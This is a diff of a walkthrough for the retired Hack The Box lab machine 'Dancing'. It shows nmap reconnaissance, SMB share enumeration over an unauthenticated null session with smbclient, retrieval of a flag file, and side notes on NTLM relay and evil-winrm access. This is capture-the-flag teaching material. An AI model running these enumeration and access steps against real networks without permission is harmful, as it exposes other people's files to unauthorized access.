@@ -11,64 +11,84 @@ tags: [htb, starting-point, windows, smb, null-session]
 
 > **Disclaimer:** This writeup is published after the machine was retired from Hack The Box. All flags are unique per user.
 
-# Dancing — HTB Starting Point
+# Dancing
 
-## Target Info
+**Hack The Box** · Very Easy · Windows
 
-| Field | Value |
-|-------|-------|
-| Platform | HTB Starting Point |
-| Target IP | <TARGET_IP> |
-| Attack IP | <ATTACK_IP> |
-| OS | Windows |
-| Difficulty | Very Easy |
+`SMB` · `Null Session` · `Share Enumeration`
 
-## Recon
+---
 
-### Nmap Scan
-- **Port 135/tcp** — MSRPC
-- **Port 139/tcp** — NetBIOS
-- **Port 445/tcp** — SMB (SMB2/3.1.1, signing enabled but not required)
-- **Port 5985/tcp** — WinRM (Microsoft HTTPAPI)
-- 996 closed ports
+## Overview
 
-## Enumeration
+Dancing introduces SMB enumeration on a Windows target. A null session (no credentials) grants access to a non-default file share containing user data. The machine also exposes WinRM, hinting at post-exploitation possibilities if credentials were found.
 
-### SMB Shares (null session)
-| Share | Type | Comment | Accessible |
-|-------|------|---------|------------|
-| ADMIN$ | Disk | Remote Admin | No |
-| C$ | Disk | Default share | No |
-| IPC$ | IPC | Remote IPC | — |
-| WorkShares | Disk | | Yes |
+---
 
-### WorkShares Contents
-- `Amy.J/worknotes.txt` (94 bytes)
-- `James.P/flag.txt` (32 bytes)
+## Reconnaissance
 
-## Exploitation
+```bash
+nmap -sC -sV <TARGET_IP>
+```
 
-- Null session SMB access to `WorkShares` share
-- `smbclient -N //<TARGET_IP>/WorkShares`
-- Navigated to `James.P/` and downloaded `flag.txt`
+```
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
 
-## Flags
+Four ports open. The interesting ones: SMB on 445 (primary target) and WinRM on 5985 (useful if we find credentials later). Nmap also reports SMB signing is enabled but not required — that's a relay attack opportunity in a real engagement.
 
-- [x] Root flag: `<flag_redacted>`
+---
 
-## Lessons Learned
+## Enumerating SMB Shares
 
-- SMB null sessions can expose file shares without authentication
-- Always enumerate SMB shares on Windows targets — non-default shares often contain sensitive data
-- SMB signing "enabled but not required" means relay attacks are possible
-- WinRM on 5985 is worth noting for potential authenticated access later
-- `smbclient -N -L` for share listing, `-N` for null (no password) authentication
+```bash
+smbclient -N -L //<TARGET_IP>
+```
 
-## Timeline
+```
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk
+```
 
-| Time | Action |
-|------|--------|
-| 2026-02-16 | Started — target spawned |
-| 2026-02-16 | Nmap scan — SMB/RPC/WinRM open |
-| 2026-02-16 | SMB null session — enumerated shares, found WorkShares |
-| 2026-02-16 | Downloaded flag from James.P/flag.txt — box complete |
+Four shares. `ADMIN$` and `C$` are default administrative shares (access denied without admin creds). `WorkShares` is a non-default share — those are always worth investigating because admins created them for a reason.
+
+---
+
+## Accessing WorkShares
+
+```bash
+smbclient -N //<TARGET_IP>/WorkShares
+```
+
+```
+smb: \> ls
+  .                                   D        0
+  ..                                  D        0
+  Amy.J                               D        0
+  James.P                             D        0
+
+smb: \James.P\> get flag.txt
+```
+
+The null session gives read access to `WorkShares`. Inside are two user directories — `Amy.J` with work notes and `James.P` with the flag. No authentication required.
+
+---
+
+## Takeaways
+
+- SMB null sessions can expose file shares without any credentials. Always enumerate shares with `-N` (null auth) as a first step on Windows targets.
+- Non-default shares (`WorkShares`, `Public`, `Data`, etc.) are prime targets — they were created intentionally and often contain sensitive data.
+- SMB signing "enabled but not required" means NTLM relay attacks are possible in a real environment.
+- WinRM on 5985 is worth noting for later — if credentials are found, it's a direct shell via `evil-winrm`.
+
+---
+
+*Walkthrough by Jack — 2026-02-16*
